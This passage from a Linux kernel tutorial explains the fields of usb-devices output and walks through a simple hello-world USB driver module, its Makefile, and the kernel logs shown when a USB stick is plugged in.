<text text-anchor='middle' x='1024' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1024' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='1032' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='1032' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='644' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='740' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='804' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='820' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='836' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='852' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='868' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='884' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='900' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='916' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='1032' y='932' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>So to summarize,</p>
<ul>
<li>Devices usually have 1 or more configurations.</li>
<li>Configs have 1 or more interfaces.</li>
<li>Interfaces have 1 or more settings.</li>
<li>Interfaces have 0 or more endpoints.</li>
</ul>
<h4 id="understanding-output-of-usb-devices">Understanding output of usb-devices</h4>
<p>Looking back at the output of <code>usb-devices</code> command, with the newly gained knowledge, we can now understand few more things from the command output.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># COMMAND --&gt;    usb-devices
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">T:  Bus=01 Lev=00 Prnt=00 Port=00 Cnt=00 Dev#=  1 Spd=480 MxCh=12
</span></span><span class="line"><span class="cl">D:  Ver= 2.00 Cls=09(hub  ) Sub=00 Prot=01 MxPS=64 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=1d6b ProdID=0002 Rev=05.18
</span></span><span class="line"><span class="cl">S:  Manufacturer=Linux 5.18.3-arch1-1 xhci-hcd
</span></span><span class="line"><span class="cl">S:  Product=xHCI Host Controller
</span></span><span class="line"><span class="cl">S:  SerialNumber=0000:00:14.0
</span></span><span class="line"><span class="cl">C:  #Ifs= 1 Cfg#= 1 Atr=e0 MxPwr=0mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=09(hub  ) Sub=00 Prot=00 Driver=hub
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   4 Ivl=256ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">T:  Bus=01 Lev=01 Prnt=01 Port=00 Cnt=01 Dev#=  5 Spd=12  MxCh= 0
</span></span><span class="line"><span class="cl">D:  Ver= 2.00 Cls=00(&gt;ifc ) Sub=00 Prot=00 MxPS= 8 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=046d ProdID=c534 Rev=29.01
</span></span><span class="line"><span class="cl">S:  Manufacturer=Logitech
</span></span><span class="line"><span class="cl">S:  Product=USB Receiver
</span></span><span class="line"><span class="cl">C:  #Ifs= 2 Cfg#= 1 Atr=a0 MxPwr=98mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=03(HID  ) Sub=01 Prot=01 Driver=usbhid
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   8 Ivl=8ms
</span></span><span class="line"><span class="cl">I:  If#= 1 Alt= 0 #EPs= 1 Cls=03(HID  ) Sub=01 Prot=02 Driver=usbhid
</span></span><span class="line"><span class="cl">E:  Ad=82(I) Atr=03(Int.) MxPS=  20 Ivl=2ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">T:  Bus=02 Lev=00 Prnt=00 Port=00 Cnt=00 Dev#=  1 Spd=5000 MxCh= 6
</span></span><span class="line"><span class="cl">D:  Ver= 3.00 Cls=09(hub  ) Sub=00 Prot=03 MxPS= 9 #Cfgs=  1
</span></span><span class="line"><span class="cl">P:  Vendor=1d6b ProdID=0003 Rev=05.18
</span></span><span class="line"><span class="cl">S:  Manufacturer=Linux 5.18.3-arch1-1 xhci-hcd
</span></span><span class="line"><span class="cl">S:  Product=xHCI Host Controller
</span></span><span class="line"><span class="cl">S:  SerialNumber=0000:00:14.0
</span></span><span class="line"><span class="cl">C:  #Ifs= 1 Cfg#= 1 Atr=e0 MxPwr=0mA
</span></span><span class="line"><span class="cl">I:  If#= 0 Alt= 0 #EPs= 1 Cls=09(hub  ) Sub=00 Prot=00 Driver=hub
</span></span><span class="line"><span class="cl">E:  Ad=81(I) Atr=03(Int.) MxPS=   4 Ivl=256ms
</span></span></code></pre></div><p>We already know that the output is grouped and what these characters at the most-left side mean. We now just need to map what rest of the things mean and how they relate to all what we have just learned.</p>
<p>So the first line in each group starts with <code>T</code>, which indicates the information in that line is related to topology of the device. <code>Bus</code> indicates what physical bus that device is connected to. <code>Lev</code> indicates the level of the node in the complete topology of that bus. Level 00 means it is the root hub. Next, level 01 will be any device connected to the main root hub (00) and all the devices connected to 01 hubs will be treated as level 02 devices and so on. <code>Spd</code> indicates the negotiated speed of that node. <code>MxCh</code> indicates how many devices can be connected to this device, and is 00 for anything except a hub.</p>
<p>Next line, starting with <code>D</code>, this shows the device information like <code>Ver</code> for USB version (mostly, 2 or 3 for now), <code>Cls</code> (class) of the device node. If this is marked as 00, then the interface should be read for the device class information. <code>Sub</code> indicates the sub-class of the node. <code>#Cfgs</code> indicate how many configurations this device has.</p>
<p>Next lines with <code>P</code> and <code>S</code> are usually the Vendor and Product IDs. Useful information if we want to write a driver for specific kinds of devices.</p>
<p>Then the remaining lines, starting with <code>C</code>, <code>I</code> and <code>E</code>, are the Configuration info, Interface info and the Endpoint info respectively. <code>#Ifs</code> tells about the total number of interfaces available for that device. <code>Cfg#</code> indicates the total number of available configurations for the device. <code>Atr</code> stores a hexadecimal value to indicate if the device is bus-powered(0x80), self-powered(0x40) or remote wake-up capable(0x20). <code>#Eps</code> indicates the endpoints for this alternate endpoint.</p>
<h3 id="usb-driver---code-walk-through">USB driver - code walk-through</h3>
<p>At this point, we roughly know what USB is comprised of and how it works inside linux kernel. Let&rsquo;s dig in the code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: GPL-2.0+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/usb.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/hid.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">hello_connect</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_interface</span> <span class="o">*</span><span class="n">interface</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">usb_device_id</span> <span class="o">*</span><span class="n">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_alert</span><span class="p">(</span><span class="s">&#34;USB plugged in.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">hello_disconnect</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_interface</span> <span class="o">*</span><span class="n">interface</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_alert</span><span class="p">(</span><span class="s">&#34;USB disconnected.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">usb_device_id</span> <span class="n">id_table</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">USB_INTERFACE_INFO</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">			<span class="n">USB_INTERFACE_CLASS_HID</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">	 		<span class="n">USB_INTERFACE_SUBCLASS_BOOT</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	  		<span class="n">USB_INTERFACE_PROTOCOL_KEYBOARD</span>
</span></span><span class="line"><span class="cl">		<span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">USB_DEVICE</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="mh">0x058f</span><span class="p">,</span>  <span class="c1">// Vendor Id
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="mh">0x6387</span>   <span class="c1">// Product Id
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">	<span class="p">{},</span>  <span class="c1">// End node - always null
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DEVICE_TABLE</span><span class="p">(</span><span class="n">usb</span><span class="p">,</span> <span class="n">id_table</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">usb_driver</span> <span class="n">driver</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#34;ayedaemonUSB&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">probe</span> <span class="o">=</span> <span class="n">hello_connect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">disconnect</span> <span class="o">=</span> <span class="n">hello_disconnect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">id_table</span> <span class="o">=</span> <span class="n">id_table</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">hello_usb</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;Hello from ayedaemonUSB.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">usb_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">driver</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">bye_usb</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pr_debug</span><span class="p">(</span><span class="s">&#34;Bye from ayedaemonUSB.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">usb_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">driver</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">hello_usb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">bye_usb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;ayedaemon&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">&#34;Eudyptula task5&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>You should be familiar with majority of the above code. This is how a simple linux module is written.</p>
<ul>
<li>First line is always the SPDX license. Read more <a href="https://www.kernel.org/doc/html/latest/process/license-rules.html">here</a></li>
<li>Then some imports from other available header files.</li>
<li>init (<code>hello_usb</code>) and exit (<code>bye_usb</code>) as entry and exit functions for the module.</li>
<li>Macro calls for registering and unregistering both init and exit functions. Along with some module metadata macro calls.</li>
</ul>
<p>Apart from this, we have some more code segment, which we are going to talk about in brief. At first, We need to create a <code>struct usb_driver</code> so that it can hold our driver information and the <code>id_table</code>. This <code>id_table</code> is very important for all the USB device drivers, as this list tells about the devices this driver can support. There are many macros that can help to define elements for this list. Each element is <code>struct  usb_device_id</code> <sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup>, and all the macros help to create this struct using only few values such as device class, product and vendor ids, etc.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">usb_device_id</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* which fields to match against? */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u16</span>		<span class="n">match_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Used for product specific matches; range is inclusive */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u16</span>		<span class="n">idVendor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u16</span>		<span class="n">idProduct</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u16</span>		<span class="n">bcdDevice_lo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u16</span>		<span class="n">bcdDevice_hi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Used for device class matches */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bDeviceClass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bDeviceSubClass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bDeviceProtocol</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Used for interface class matches */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bInterfaceClass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bInterfaceSubClass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bInterfaceProtocol</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Used for vendor-specific interface matches */</span>
</span></span><span class="line"><span class="cl">	<span class="n">__u8</span>		<span class="n">bInterfaceNumber</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* not matched against */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">kernel_ulong_t</span>	<span class="n">driver_info</span>
</span></span><span class="line"><span class="cl">		<span class="nf">__attribute__</span><span class="p">((</span><span class="nf">aligned</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">kernel_ulong_t</span><span class="p">))));</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>So when we load this module into a running kernel:-</p>
<ul>
<li>the <code>hello_usb</code> function will be executed and this in-turn will execute the <code>usb_register</code> function.</li>
<li><code>usb_register</code> function will register the device driver we created with <code>struct usb_driver</code>.</li>
<li>This <code>usb_driver</code> will need few parameters like the name of the driver, functions to be called when this driver is loaded/unloaded by usb core. USB core will load this driver automatically, using hot-plug feature, when any usb device (which is supported by this driver) is plugged in.</li>
<li>Along with other fields, <code>usb_driver</code> also contains a field that stores a list of all the devices this driver supports. This is used by USB core to know when to bind this driver with the usb device.</li>
<li><code>MODULE_DEVICE_TABLE</code> is the macro that exports the <code>id_table</code> to the usb core</li>
</ul>
<h4 id="final-steps">Final steps</h4>
<p>Now,all we need is a <code>Makefile</code> to make everything a bit automated and we are good to compile and load our USB module into the running kernel.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">CFLAGS_helloworld.o</span> <span class="o">=</span> -DDEBUG
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">+=</span> HelloWorld.o
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">KDIR</span> <span class="o">?=</span> /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build
</span></span><span class="line"><span class="cl"><span class="nv">PWD</span> <span class="o">:=</span> <span class="k">$(</span>shell <span class="nb">pwd</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span> <span class="n">uninstall</span>
</span></span><span class="line"><span class="cl">	<span class="k">$(</span>MAKE<span class="k">)</span> -C <span class="k">$(</span>KDIR<span class="k">)</span> <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">install</span><span class="o">:</span> <span class="n">default</span>
</span></span><span class="line"><span class="cl">	sudo insmod HelloWorld.ko
</span></span><span class="line"><span class="cl">	lsmod <span class="p">|</span> grep HelloWorld
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">uninstall</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">	- lsmod <span class="p">|</span> grep HelloWorld
</span></span><span class="line"><span class="cl">	- sudo rmmod HelloWorld.ko
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">reload</span><span class="o">:</span> <span class="n">uninstall</span> <span class="n">clean</span> <span class="n">default</span> <span class="n">install</span>
</span></span><span class="line"><span class="cl">	@echo -e <span class="s2">&#34;\nDONE&#34;</span>
</span></span></code></pre></div><p>Just by doing <code>make install</code> we can compile and load the module into the kernel. There are multiple ways to monitor changes in kernel, for this case, I&rsquo;ll use <code>journalctl</code>, <code>udevadm</code> and <code>lsusb</code> commands to check the module messages, USB changes, and associated driver information for my device.</p>
<p>To begin with anything, we need to compile and install the module and check the messages from kernel.</p>
<p>Compile and load:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">make install
</span></span></code></pre></div><p>Check kernel logs:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">### COMMAND:-  udevadm monitor --kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">KERNEL[1736.016830] bind     /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0 (usb)
</span></span><span class="line"><span class="cl">KERNEL[1736.016864] add      /bus/usb/drivers/ayedaemonUSBdriver (drivers)
</span></span><span class="line"><span class="cl">KERNEL[1736.016888] add      /module/HelloWorld (module)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### COMMAND:-  journalctl --grep=usb -f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Jun 29 11:11:41 FatSaturn kernel: usbcore: registered new interface driver ayedaemonUSBdriver
</span></span><span class="line"><span class="cl">Jun 29 11:11:41 FatSaturn kernel: USB driver registered this time
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### COMMAND:-  lsmod | grep HelloWorld
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HelloWorld             20480  0
</span></span></code></pre></div><p>The above logs helps us to identify that our module was loaded to the kernel successfully. Now time to insert the USB stick (pen-drive).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">### COMMAND:-  udevadm monitor --kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">KERNEL[1981.372348] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3 (usb)
</span></span><span class="line"><span class="cl">KERNEL[1981.377254] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0 (usb)
</span></span><span class="line"><span class="cl">KERNEL[1981.378079] add      /devices/virtual/workqueue/scsi_tmf_3 (workqueue)
</span></span><span class="line"><span class="cl">KERNEL[1981.379821] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3 (scsi)
</span></span><span class="line"><span class="cl">KERNEL[1981.379930] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/scsi_host/host3 (scsi_host)
</span></span><span class="line"><span class="cl">KERNEL[1981.380070] bind     /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0 (usb)
</span></span><span class="line"><span class="cl">KERNEL[1981.380229] bind     /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3 (usb)
</span></span><span class="line"><span class="cl">KERNEL[1982.383440] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0 (scsi)
</span></span><span class="line"><span class="cl">KERNEL[1982.383621] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0 (scsi)
</span></span><span class="line"><span class="cl">KERNEL[1982.383811] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/scsi_device/3:0:0:0 (scsi_device)
</span></span><span class="line"><span class="cl">KERNEL[1982.384405] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/scsi_disk/3:0:0:0 (scsi_disk)
</span></span><span class="line"><span class="cl">KERNEL[1982.385312] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/bsg/3:0:0:0 (bsg)
</span></span><span class="line"><span class="cl">KERNEL[1982.389641] add      /devices/virtual/bdi/8:32 (bdi)
</span></span><span class="line"><span class="cl">KERNEL[1982.408429] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/block/sdc (block)
</span></span><span class="line"><span class="cl">KERNEL[1982.408491] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/block/sdc/sdc1 (block)
</span></span><span class="line"><span class="cl">KERNEL[1982.408532] add      /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0/block/sdc/sdc2 (block)
</span></span><span class="line"><span class="cl">KERNEL[1982.410675] bind     /devices/pci0000:00/0000:00:14.0/usb1/1-4/1-4.3/1-4.3:1.0/host3/target3:0:0/3:0:0:0 (scsi)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">### COMMAND:-  journalctl --grep=usb -f
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Jun 29 11:15:46 FatSaturn kernel: usb 1-4.3: new high-speed USB device number 12 using xhci_hcd
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb 1-4.3: New USB device found, idVendor=058f, idProduct=6387, bcdDevice= 1.00
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb 1-4.3: New USB device strings: Mfr=1, Product=2, SerialNumber=3
</span></span><span class="line"><span class="cl">Jun 29 11:15:47 FatSaturn kernel: usb 1-4.3: Product: Mass Storage
